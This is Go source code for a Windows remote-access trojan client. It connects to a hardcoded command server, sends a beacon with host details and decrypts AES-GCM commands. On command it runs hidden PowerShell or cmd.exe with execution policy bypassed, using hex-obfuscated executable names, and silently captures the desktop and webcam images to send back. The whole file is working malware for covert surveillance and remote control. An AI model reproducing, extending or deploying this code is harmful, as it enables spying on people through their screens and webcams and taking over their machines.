package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/sha256"
	"crypto/sha512"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"image"
	"image/color"
	"image/png"
	"log"
	"net"
	"os"
	"os/exec"
	"os/signal"
	"path/filepath"
	"regexp"
	"runtime"
	"strings"
	"sync"
	"syscall"
	"time"
	"unicode/utf16"
	"unsafe"

	"golang.org/x/crypto/pbkdf2"
	"golang.org/x/sys/windows"
)

var (
	CVER            string = "0.2.0"
	TYPE            string = "go"
	chunkSize       int    = 1024
	client          net.Conn
	sessionId       string
	logStream       *log.Logger
	logEnabled      bool      = false
	logpath         string    = "logs/client.log"
	address         string    = "10.0.0.127"
	port            string    = "54678"
	startTime       time.Time = time.Now().UTC()
	exitProcess     bool      = false
	sentFirstBeacon bool      = false
	//maxRetries        int       = 5
	//beaconMinInterval uint32    = 5 * 60 * 1000
	//beaconMaxInterval uint32    = 45 * 60 * 1000
	retryIntervals = []int{
		10000,
		30000,
		(1 * 60 * 1000),
		(2 * 60 * 1000),
		(4 * 60 * 1000),
		(6 * 60 * 1000),
	}

	avicap32                = windows.NewLazySystemDLL("avicap32.dll")
	capCreateCaptureWindowA = avicap32.NewProc("capCreateCaptureWindowA")

	user32           = windows.NewLazySystemDLL("user32.dll")
	closeClipboard   = user32.NewProc("CloseClipboard")
	getClipboardData = user32.NewProc("GetClipboardData")
	openClipboard    = user32.NewProc("OpenClipboard")
	sendMessageA     = user32.NewProc("SendMessageA")

	kernel32     = windows.NewLazySystemDLL("kernel32.dll")
	globalLock   = kernel32.NewProc("GlobalLock")
	globalSize   = kernel32.NewProc("GlobalSize")
	globalUnlock = kernel32.NewProc("GlobalUnlock")

	gdi32                  = windows.NewLazySystemDLL("gdi32.dll")
	bitBlt                 = gdi32.NewProc("BitBlt")
	createDIBSection       = gdi32.NewProc("CreateDIBSection")
	deleteDC               = gdi32.NewProc("DeleteDC")
	deleteObject           = gdi32.NewProc("DeleteObject")
	getSystemMetrics       = gdi32.NewProc("GetSystemMetrics")
	getDC                  = gdi32.NewProc("GetDC")
	getDIBits              = gdi32.NewProc("GetDIBits")
	createCompatibleDC     = gdi32.NewProc("CreateCompatibleDC")
	createCompatibleBitmap = gdi32.NewProc("CreateCompatibleBitmap")
	releaseDC              = gdi32.NewProc("ReleaseDC")
	selectObject           = gdi32.NewProc("SelectObject")
)

const (
	WM_CAP_DRIVER_CONNECT    = 0x0400 + 10
	WM_CAP_DRIVER_DISCONNECT = 0x0400 + 11
	WM_CAP_EDIT_COPY         = 0x0400 + 30
	WM_CAP_SET_PREVIEW       = 0x0400 + 50
	WM_CAP_GRAB_FRAME        = 0x0400 + 60

	CF_DIB = 8

	SM_CXSCREEN = 0
	SM_CYSCREEN = 1
	SRCCOPY     = 0x00CC0020
)

type (
	BITMAPINFO struct {
		BmiHeader BITMAPINFOHEADER
		BmiColors [1]RGBQUAD
	}
	BITMAPINFOHEADER struct {
		BiSize          uint32
		BiWidth         int32
		BiHeight        int32
		BiPlanes        uint16
		BiBitCount      uint16
		BiCompression   uint32
		BiSizeImage     uint32
		BiXPelsPerMeter int32
		BiYPelsPerMeter int32
		BiClrUsed       uint32
		BiClrImportant  uint32
	}
	RGBQUAD struct {
		RgbBlue     byte
		RgbGreen    byte
		RgbRed      byte
		RgbReserved byte
	}
)

func WriteLog(message string, v ...any) {
	if logEnabled {
		if err := os.MkdirAll(filepath.Dir(logpath), 0755); err != nil {
			logEnabled = false
			log.Fatalf("Failed to create log directory: %v", err)
		}
		file, err := os.OpenFile(logpath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
		if err != nil {
			logEnabled = false
			log.Fatalf("Failed to open log file: %v", err)
		}
		defer file.Close()
		if logStream == nil {
			logStream = log.New(file, "", log.LstdFlags|log.Lshortfile)
		}
		if len(v) > 0 {
			message = fmt.Sprintf(message, v...)
		}
		logStream.Println(message)
	}
}

func GetSessionID() {
	if client == nil {
		WriteLog("Client is not properly initialized.")
		return
	}
	ipAddress := client.LocalAddr().String()
	if ipAddress == "::1" {
		ipAddress = "127.0.0.1"
	}
	WriteLog("IP Address: %s\n", ipAddress)
	parts := strings.Split(ipAddress, ".")
	sumIp := 0
	for _, part := range parts {
		var partInt int
		fmt.Sscanf(part, "%d", &partInt)
		sumIp += partInt
	}
	data := fmt.Sprintf("%s<>%d", ipAddress, sumIp)
	hash := sha256.New()
	hash.Write([]byte(data))
	hashBytes := hash.Sum(nil)
	crypt := hex.EncodeToString(hashBytes)[:32]
	sessionId = strings.ToLower(crypt)
	WriteLog("Session ID: %s\n", sessionId)
}

func EncryptData(data, sharedKey string) (string, error) {
	salt := make([]byte, 32)
	if _, err := rand.Read(salt); err != nil {
		return "", err
	}

	key := pbkdf2.Key([]byte(sharedKey), salt, 200000, 32, sha512.New)

	iv := make([]byte, 12)
	if _, err := rand.Read(iv); err != nil {
		return "", err
	}

	block, err := aes.NewCipher(key)
	if err != nil {
		return "", err
	}

	aead, err := cipher.NewGCM(block)
	if err != nil {
		return "", err
	}

	ciphertext := aead.Seal(nil, iv, []byte(data), nil)
	authTag := aead.Overhead()

	encryptedData := fmt.Sprintf("%s:%s:%s:%s",
		base64.StdEncoding.EncodeToString(salt),
		base64.StdEncoding.EncodeToString(iv),
		base64.StdEncoding.EncodeToString(ciphertext[len(ciphertext)-authTag:]),
		base64.StdEncoding.EncodeToString(ciphertext[:len(ciphertext)-authTag]),
	)

	return encryptedData, nil
}

// DecryptData decrypts the encrypted data using AES-256-GCM with the provided sharedKey
func DecryptData(encrypted, sharedKey string) (string, error) {
	parts := strings.Split(encrypted, ":")
	if len(parts) != 4 {
		return "", fmt.Errorf("invalid encrypted data format")
	}

	salt, err := base64.StdEncoding.DecodeString(parts[0])
	if err != nil {
		return "", err
	}

	iv, err := base64.StdEncoding.DecodeString(parts[1])
	if err != nil {
		return "", err
	}

	authTag, err := base64.StdEncoding.DecodeString(parts[2])
	if err != nil {
		return "", err
	}

	encryptedData, err := base64.StdEncoding.DecodeString(parts[3])
	if err != nil {
		return "", err
	}

	key := pbkdf2.Key([]byte(sharedKey), salt, 200000, 32, sha512.New)

	block, err := aes.NewCipher(key)
	if err != nil {
		return "", err
	}

	aead, err := cipher.NewGCM(block)
	if err != nil {
		return "", err
	}

	ciphertext := append(encryptedData, authTag...)
	decrypted, err := aead.Open(nil, iv, ciphertext, nil)
	if err != nil {
		return "", err
	}

	return string(decrypted), nil
}

func GetRetryInterval(retries int) int {
	if retries < len(retryIntervals) {
		return retryIntervals[retries]
	}
	return 0
}

// SendCommand sends encrypted data in chunks
func SendCommand(response interface{}) {
	jsonData, err := json.Marshal(response)
	if err != nil {
		WriteLog("Failed to marshal response: %v", err)
		return
	}

	encrypted, err := EncryptData(string(jsonData), sessionId)
	if err != nil {
		WriteLog("Failed to encrypt data: %v", err)
		return
	}

	// Split the encrypted data into chunks and send each chunk
	encryptedBytes := []byte(encrypted)
	totalLength := len(encryptedBytes)

	if totalLength >= chunkSize {
		for i := 0; i < totalLength; i += chunkSize {
			end := i + chunkSize
			if end > totalLength {
				end = totalLength
			}

			chunk := encryptedBytes[i:end]
			if end == totalLength {
				chunk = append(chunk, []byte("--FIN--")...)
			}

			WriteLog("Sent Chunk: %s", string(chunk))

			if _, err := client.Write(chunk); err != nil {
				WriteLog("failed to write chunk to client: %w", err)
				return
			}
		}
	} else {
		WriteLog("Sent Data: %s", encrypted)

		if _, err := client.Write(encryptedBytes); err != nil {
			WriteLog("failed to write data to client: %w", err)
			return
		}
	}
}

func SendBeacon() {
	maj, min, patch := windows.RtlGetNtVersionNumbers()
	osver := fmt.Sprintf("%d.%d.%d", maj, min, patch)
	hostname, err := os.Hostname()
	if err != nil {
		WriteLog("Failed to get hostname: %s", err.Error())
		return
	}
	payloadData := map[string]interface{}{
		"response": map[string]interface{}{
			"beacon":   true,
			"version":  CVER,
			"type":     TYPE,
			"platform": runtime.GOOS,
			"arch":     runtime.GOARCH,
			"osver":    osver,
			"hostname": hostname,
		},
	}
	payloadBytes, err := json.Marshal(payloadData)
	if err != nil {
		WriteLog("Failed to marshal JSON payload: %s", err.Error())
		return
	}
	payload := string(payloadBytes)
	go SendCommand(payload)
}

func Sleep(ms int) {
	time.Sleep(time.Duration(ms) * time.Millisecond)
}

// utf8To16 converts a UTF-8 string to a UTF-16 encoded byte slice.
func utf8To16(str string) []byte {
	utf16Codes := utf16.Encode([]rune(str))
	buffer := bytes.NewBuffer(make([]byte, 0, len(utf16Codes)*2))
	for _, code := range utf16Codes {
		buffer.WriteByte(byte(code))
		buffer.WriteByte(byte(code >> 8))
	}
	return buffer.Bytes()
}

func FormatFileName(name, extension string) string {
	now := time.Now()
	year := now.Year()
	month := fmt.Sprintf("%02d", now.Month())
	day := fmt.Sprintf("%02d", now.Day())
	hours := fmt.Sprintf("%02d", now.Hour())
	minutes := fmt.Sprintf("%02d", now.Minute())
	seconds := fmt.Sprintf("%02d", now.Second())
	ext := strings.TrimPrefix(extension, ".")
	return fmt.Sprintf("%s_%d-%s-%s_%s-%s-%s.%s", name, year, month, day, hours, minutes, seconds, ext)
}

func CaptureWebcam() ([]byte, error) {
	windowName, err := windows.UTF16PtrFromString("WebcamCapture")
	if err != nil {
		return nil, fmt.Errorf("failed to convert window name: %v", err)
	}
	handle, _, err := capCreateCaptureWindowA.Call(
		uintptr(unsafe.Pointer(windowName)),
		0, 0, 0, 320, 240, 0, 0)
	if handle == 0 {
		return nil, fmt.Errorf("failed to create capture window: %v", err)
	}
	defer sendMessageA.Call(handle, WM_CAP_DRIVER_DISCONNECT, 0, 0)
	ret, _, err := sendMessageA.Call(handle, WM_CAP_DRIVER_CONNECT, 0, 0)
	if ret == 0 {
		return nil, fmt.Errorf("failed to connect to driver: %v", err)
	}
	sendMessageA.Call(handle, WM_CAP_SET_PREVIEW, 1, 0)
	sendMessageA.Call(handle, WM_CAP_GRAB_FRAME, 0, 0)
	sendMessageA.Call(handle, WM_CAP_EDIT_COPY, 0, 0)
	img, err := GetImageFromClipboard()
	if err != nil {
		return nil, fmt.Errorf("failed to get image from clipboard: %v", err)
	}
	var buf bytes.Buffer
	err = png.Encode(&buf, img)
	if err != nil {
		return nil, fmt.Errorf("failed to encode image as PNG: %v", err)
	}
	return buf.Bytes(), nil
}

func CaptureDesktop() ([]byte, error) {
	screenDC, _, _ := getDC.Call(0)
	if screenDC == 0 {
		return nil, fmt.Errorf("failed to get screen device context")
	}
	defer releaseDC.Call(0, screenDC)
	hdcMem, _, _ := createCompatibleDC.Call(screenDC)
	if hdcMem == 0 {
		return nil, fmt.Errorf("failed to create compatible device context")
	}
	defer deleteDC.Call(hdcMem)
	screenWidth, _, _ := getSystemMetrics.Call(SM_CXSCREEN)
	screenHeight, _, _ := getSystemMetrics.Call(SM_CYSCREEN)
	bitmap, _, _ := createCompatibleBitmap.Call(screenDC, screenWidth, screenHeight)
	if bitmap == 0 {
		return nil, fmt.Errorf("failed to create compatible bitmap")
	}
	defer deleteObject.Call(bitmap)
	oldBitmap, _, _ := selectObject.Call(hdcMem, bitmap)
	defer selectObject.Call(hdcMem, oldBitmap)
	ret, _, _ := bitBlt.Call(
		hdcMem, 0, 0, screenWidth, screenHeight,
		screenDC, 0, 0, SRCCOPY,
	)
	if ret == 0 {
		return nil, fmt.Errorf("BitBlt failed")
	}
	img, err := bitmapToImage(hdcMem, screenWidth, screenHeight)
	if err != nil {
		return nil, fmt.Errorf("failed to convert bitmap to image: %v", err)
	}
	var buf bytes.Buffer
	err = png.Encode(&buf, img)
	if err != nil {
		return nil, fmt.Errorf("failed to encode image as PNG: %v", err)
	}
	return buf.Bytes(), nil
}

func bitmapToImage(hdcMem, width, height uintptr) (image.Image, error) {
	bmi := BITMAPINFO{
		BmiHeader: BITMAPINFOHEADER{
			BiSize:        uint32(unsafe.Sizeof(BITMAPINFOHEADER{})),
			BiWidth:       int32(width),
			BiHeight:      int32(-height), // Negative height to specify top-down DIB
			BiPlanes:      1,
			BiBitCount:    24, // 24 bits per pixel (RGB)
			BiCompression: 0,  // BI_RGB, no compression
		},
	}
	var bmpSize uint32
	_, _, _ = getDIBits.Call(
		hdcMem,
		0, // Bitmap handle is not necessary for this call
		0,
		0,
		uintptr(unsafe.Pointer(&bmi)),
		0,
		uintptr(unsafe.Pointer(&bmpSize)),
	)
	if bmpSize == 0 {
		return nil, fmt.Errorf("failed to get bitmap data size")
	}
	data := make([]byte, bmpSize)
	_, _, _ = getDIBits.Call(
		hdcMem,
		0, // Bitmap handle is not necessary for this call
		0,
		height,
		uintptr(unsafe.Pointer(&bmi)),
		uintptr(unsafe.Pointer(&data[0])),
		0,
	)
	img := image.NewRGBA(image.Rect(0, 0, int(width), int(height)))
	rowSize := (width*3 + 3) &^ 3 // Row size rounded up to the nearest 4 bytes
	for y := 0; y < int(height); y++ {
		for x := 0; x < int(width); x++ {
			offset := (y*int(rowSize) + x*3)
			r := data[offset+2]
			g := data[offset+1]
			b := data[offset+0]
			img.Set(x, int(height)-y-1, color.RGBA{R: r, G: g, B: b, A: 255})
		}
	}
	return img, nil
}

// Retrieves an image from the clipboard.
func GetImageFromClipboard() (image.Image, error) {
	ret, _, _ := openClipboard.Call(0)
	if ret == 0 {
		return nil, fmt.Errorf("failed to open clipboard")
	}
	defer closeClipboard.Call()
	handle, _, _ := getClipboardData.Call(CF_DIB)
	if handle == 0 {
		return nil, fmt.Errorf("failed to get clipboard data")
	}
	size, _, _ := globalSize.Call(handle)
	ptr, _, _ := globalLock.Call(handle)
	if ptr == 0 {
		return nil, fmt.Errorf("failed to lock global memory")
	}
	defer globalUnlock.Call(handle)
	bitmapInfo := (*BITMAPINFO)(unsafe.Pointer(ptr))
	width := int(bitmapInfo.BmiHeader.BiWidth)
	height := int(bitmapInfo.BmiHeader.BiHeight)
	biSize := uintptr(bitmapInfo.BmiHeader.BiSize)
	colorTableSize := uintptr(bitmapInfo.BmiHeader.BiClrUsed) * unsafe.Sizeof(RGBQUAD{})
	dataOffset := biSize + colorTableSize
	dataSize := uintptr(size) - dataOffset
	var bits unsafe.Pointer
	hdc, _, _ := createDIBSection.Call(0, uintptr(unsafe.Pointer(bitmapInfo)), 0, uintptr(unsafe.Pointer(&bits)), 0, 0)
	if hdc == 0 {
		return nil, fmt.Errorf("failed to create DIB section")
	}
	defer deleteObject.Call(hdc)
	dataPtr := uintptr(ptr) + dataOffset
	copy((*[1 << 30]byte)(bits)[:dataSize:dataSize], (*[1 << 30]byte)(unsafe.Pointer(dataPtr))[:dataSize:dataSize])
	img := &image.RGBA{
		Pix:    (*[1 << 30]uint8)(bits)[:width*height*4],
		Stride: width * 4,
		Rect:   image.Rect(0, 0, width, height),
	}
	return img, nil
}

func RunCommand(command string, payload string, isFile bool) (string, error) {
	command = strings.TrimSpace(command)
	if command == "" {
		return "", errors.New("no command provided")
	}
	if command != "cmd" && command != "ps" {
		return "", errors.New("unsupported command")
	}

	var args []string
	switch command {
	case "cmd":
		if strings.Contains(payload, ";") || strings.Contains(payload, "&") {
			return "", errors.New("invalid characters in payload")
		}
		args = []string{"/c", payload}
		command = "\x63\x6d\x64\x2e\x65\x78\x65"
	case "ps":
		args = []string{
			"-NonInteractive",
			"-NoLogo",
			"-NoProfile",
			"-WindowStyle", "hidden",
			"-ExecutionPolicy", "Bypass",
		}
		if isFile {
			args = append(args, "-File", payload)
		} else {
			encodedCmd := base64.StdEncoding.EncodeToString(utf8To16(payload))
			args = append(args, "-EncodedCommand", encodedCmd)
		}
		command = "\x70\x6f\x77\x65\x72\x73\x68\x65\x6c\x6c\x2e\x65\x78\x65"
	}

	cmd := exec.Command(command, args...)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}

	var stdout, stderr bytes.Buffer
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr

	err := cmd.Start()
	if err != nil {
		WriteLog("failed to execute command: %s", err.Error())
		return "", err
	}

	done := make(chan error, 1)
	go func() {
		done <- cmd.Wait()
	}()

	select {
	case <-time.After(30 * time.Second):
		if err := cmd.Process.Kill(); err != nil {
			return "", fmt.Errorf("failed to kill process: %v", err)
		}
		return "", errors.New("command timed out")
	case err := <-done:
		if err != nil {
			return "", fmt.Errorf("command failed: %v. Error output: %s", err, stderr.String())
		}
	}
	return stdout.String(), nil
}

func FormatTime(milliseconds int64) string {
	totalSeconds := milliseconds / 1000
	days := totalSeconds / 86400
	hours := (totalSeconds % 86400) / 3600
	minutes := (totalSeconds % 3600) / 60
	seconds := totalSeconds % 60
	return fmt.Sprintf("%dd %dh %dm %ds", days, hours, minutes, seconds)
}

func GetUptime() string {
	currentTime := time.Now()
	uptimeMillis := currentTime.Sub(startTime).Milliseconds()
	return FormatTime(uptimeMillis)
}

func ParseAction(action string) {
	defer func() {
		if r := recover(); r != nil {
			SendCommand(map[string]interface{}{
				"response": map[string]interface{}{
					"error": fmt.Sprintf("Error: %v", r),
				},
			})
		}
	}()

	action = strings.TrimSpace(action)
	re := regexp.MustCompile(`(?:(?:"[^"]*")|(?:\S+))`)
	parts := re.Split(action, -1)
	if len(parts) < 1 {
		SendCommand(map[string]interface{}{
			"response": map[string]interface{}{
				"error": "Invalid action format",
			},
		})
		return
	}
	command := parts[0]
	properties := parts[1:]
	WriteLog("Command: %s - Properties: %s", command, strings.Join(properties, " "))
	switch command {
	case "ps", "cmd":
		if len(properties) > 0 {
			payloadBytes, err := base64.StdEncoding.DecodeString(properties[0])
			if err != nil {
				SendCommand(map[string]interface{}{
					"response": map[string]interface{}{
						"error": fmt.Sprintf("Error decoding base64: %v", err),
					},
				})
				return
			}
			payload := string(payloadBytes)
			RunCommand(command, payload, false)
		}
	case "up":
		uptime := GetUptime()
		SendCommand(map[string]interface{}{
			"response": map[string]interface{}{
				"data": uptime,
			},
		})
		return
	case "di":
		exitProcess = true
		if client != nil {
			client.Close()
		}
		WriteLog("Exiting process.")
		// os.Exit(0)
		return
	case "ss":
		result, err := CaptureDesktop()
		if err != nil {
			SendCommand(map[string]interface{}{
				"response": map[string]interface{}{
					"error": err.Error(),
				},
			})
			return
		}
		SendCommand(map[string]interface{}{
			"response": map[string]interface{}{
				"data":     result,
				"filename": FormatFileName("ss", "png"),
			},
		})
		return
	case "wc":
		img, err := CaptureWebcam()
		if err != nil {
			SendCommand(map[string]interface{}{
				"response": map[string]interface{}{
					"error": fmt.Sprintf("Error running webcam clip: %v", err),
				},
			})
			return
		}
		SendCommand(map[string]interface{}{
			"response": map[string]interface{}{
				"data":     img,
				"filename": FormatFileName("wc", "png"),
			},
		})
		return
	default:
		return
	}
}

func HandleConnection(conn net.Conn) {
	defer conn.Close()
	buf := make([]byte, 1024)
	n, err := conn.Read(buf)
	if err != nil {
		WriteLog("Error reading from connection: %v", err)
		return
	}
	if n == 0 {
		return
	}
	data := buf[:n]
	WriteLog("Received Data: %s", string(data))
	action, err := DecryptData(string(data), sessionId)
	if err != nil {
		WriteLog("DecryptData error: %v", err)
	}
	if len(action) != 0 {
		ParseAction(action)
	}
}

func ConnectToServer() {
	for !exitProcess {
		if client == nil {
			// Connect to the server
			conn, err := net.Dial("tcp", address+":"+port)
			if err != nil {
				WriteLog(err.Error())
				exitProcess = true
			}
			client = conn
		}
		if len(sessionId) == 0 {
			GetSessionID()
		}
		if !sentFirstBeacon {
			SendBeacon() // Send a beacon
			sentFirstBeacon = true
		}
		HandleConnection(client)
	}
}

func main() {
	var wg sync.WaitGroup
	wg.Add(1)

	go func() {
		defer wg.Done()
		ConnectToServer()
	}()

	// Set up a channel to listen for interrupt signals
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, os.Interrupt, syscall.SIGTERM)

	// Wait for an interrupt signal
	<-sigChan

	// Set exitProcess to true to stop the connection loop
	exitProcess = true

	// Close the client connection if it's open
	if client != nil {
		client.Close()
	}

	// Wait for the goroutine to finish
	wg.Wait()
}
